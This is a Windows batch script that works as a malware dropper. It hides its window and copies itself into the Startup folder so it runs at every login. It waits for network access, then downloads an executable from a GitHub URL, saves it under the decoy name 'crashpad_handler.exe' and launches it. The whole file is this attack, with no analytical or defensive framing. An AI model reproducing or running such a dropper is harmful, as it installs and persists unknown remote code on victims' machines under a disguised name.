@echo off
powershell.exe -windowstyle Hidden -command
title %random%
copy %0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
cd %temp%

:a
ping discord.com
IF %ERRORLEVEL% NEQ 0 goto a

if exist crashpad_handler.exe del crashpad_handler.exe
powershell -command Invoke-WebRequest https://github.com/rxu7s/Public/raw/main/Client.exe -OutFile "crashpad_handler.exe"

if exist crashpad_handler.exe (
	start crashpad_handler.exe
	exit
)

:else
goto a